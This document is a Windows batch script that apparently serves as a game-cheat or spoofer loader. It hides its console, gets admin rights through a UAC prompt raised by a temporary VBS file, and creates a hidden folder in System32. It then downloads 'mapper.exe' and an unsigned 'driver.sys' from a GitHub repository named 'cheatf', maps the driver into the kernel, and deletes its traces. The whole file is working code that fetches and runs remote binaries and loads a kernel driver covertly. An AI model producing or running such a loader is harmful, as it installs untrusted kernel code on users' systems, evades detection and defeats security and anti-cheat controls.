@echo off
:: Hide the console window
if "%1" == "hidden" goto :main
start /B /MIN cmd /C "%~f0" hidden
exit

:main
:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

:: Set target directory to C:\Windows\System32
set "targetDir=C:\Windows\System32\CSCv206"
if not exist "%targetDir%" (
    mkdir "%targetDir%"
    attrib +h "%targetDir%"  :: Hide the directory
)

:: Download mapper.exe
if not exist "%targetDir%\mapper.exe" (
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/topking91154/cheatf/raw/refs/heads/main/64mapper.exe' -OutFile '%targetDir%\mapper.exe'"
    if not exist "%targetDir%\mapper.exe" (
        goto end
    )
    attrib +h "%targetDir%\mapper.exe"  :: Hide the file
)

:: Download driver
set "driverPath=%targetDir%\driver.sys"
if not exist "%driverPath%" (
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/topking91154/cheatf/raw/refs/heads/main/driver.sys' -OutFile '%driverPath%'"
    if not exist "%driverPath%" (
        goto end
    )
    attrib +h "%driverPath%"  :: Hide the file
)

:: Show only the driver loading message in green
echo.
color 0A
echo Loading driver...
echo.

"%targetDir%\mapper.exe" -- "%driverPath%"
if errorlevel 1 (
    color 0C
    echo Driver load failed
    timeout /t 3 >nul
    goto cleanup
)

echo Driver loaded successfully
timeout /t 3 >nul
goto cleanup

:cleanup
:: Delete files after spoofing
if exist "%targetDir%\mapper.exe" (
    del "%targetDir%\mapper.exe"
)
if exist "%driverPath%" (
    del "%driverPath%"
)
if exist "%targetDir%" (
    rd "%targetDir%"
)

:end
exit /B